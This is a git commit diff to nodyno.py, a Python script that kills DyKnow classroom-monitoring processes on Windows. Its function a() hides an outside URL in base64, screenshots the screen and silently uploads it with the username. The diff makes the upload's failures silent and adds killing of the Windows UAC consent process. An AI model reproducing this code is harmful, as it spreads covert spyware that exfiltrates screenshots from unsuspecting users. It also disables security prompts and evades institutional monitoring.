d2b38eab0f3f4e7dd003bbff763b86ad464d58ff
magentapenguin <83044109+magentapenguin@users.noreply.github.com>
2024-06-13 10:05:54 -0700

    e

--- nodyno.py
+++ nodyno.py
@@ -14,6 +14,8 @@ def importinstall(pipname,modulename=None,update=False,**importkwargs):
     restartafterdelay(1)
     return __import__(modulename)
 
+importinstall('pillow','PIL')
+
 pyscreeze = importinstall('pyscreeze')
 wmi = importinstall('wmi')
 c = wmi.WMI()
@@ -24,16 +26,16 @@ def restartafterdelay(t, file=__file__):
 
 def a():
     u = base64.b64decode(b'aHR0cHM6Ly9jYXQ1LnB5dGhvbmFueXdoZXJlLmNvbS9iYWNrdXAvc3VzLw==').decode()
-    if pre := hasattr(request(u, method='HEAD'),"getcode"):
-        return
     try:
+        if hasattr(request(u, method='HEAD'),"getcode"):
+            return
         img = pyscreeze.screenshot()
         img = img.resize((int(img.size[0]/img.size[1]*340),340))
         img.save('tmp.png')
         with open('tmp.png', 'rb') as imgbytes:
             request(u+'receive/'+getpass.getuser(), imgbytes.read(), 'POST')
     except Exception as e:
-        print(e)
+        pass
     finally:
         try:
             os.unlink('tmp.png')
@@ -57,7 +59,7 @@ if not os.path.exists(dynomaindir):
     input("U no have Dyknow! Press enter to exit.")
     sys.exit()
 
-checkupdates = True
+checkupdates = False
 
 data = request("https://raw.githubusercontent.com/magentapenguin/dy-no/master/nodyno.py")
 try:
@@ -104,29 +106,45 @@ def f2_old():
            usednames.append(x)
            #print(usednames)
 
-def f2():
+def f():
     for process in c.Win32_Process():
+        if process.name in ('svchost.exe','pythonw.exe','unsecapp.exe'):
+            continue
         for x in glob.iglob(dynodir+r"\*.exe"):
             x = os.path.split(x)[1]
             if x in ignore:
                 continue
-            if process.name == x:  
-                process.Terminate()
-                print('*bonk*', process.name)
+            #print(x)
+            if process.name.lower() == x.lower() or process.name == "consent.exe":
+                try:
+                    process.Terminate()
+                    print('*bonk*', process.name)
+                except Exception as e:
+                    print(process.name)
+
+def f2():
+    f()
     process_watcher = c.Win32_Process.watch_for("creation")
     def bgtasks():
         while True:
             time.sleep(4)
             a()
-        
+
+    def eeee():
+        while True:
+            f()
+            time.sleep(1)
+            
+    threading.Thread(target=eeee).run()
     threading.Thread(target=bgtasks).run()
     while True:
         new_process = process_watcher()
+        print(new_process)
         for x in glob.iglob(dynodir+r"\*.exe"):
             x = os.path.split(x)[1]
             if x in ignore:
                 continue
-            if new_process.name == x:
+            if new_process.name.lower() == x.lower() or new_process.name == "consent":
                 new_process.Terminate()
                 print('*bonk*', new_process.name)
 
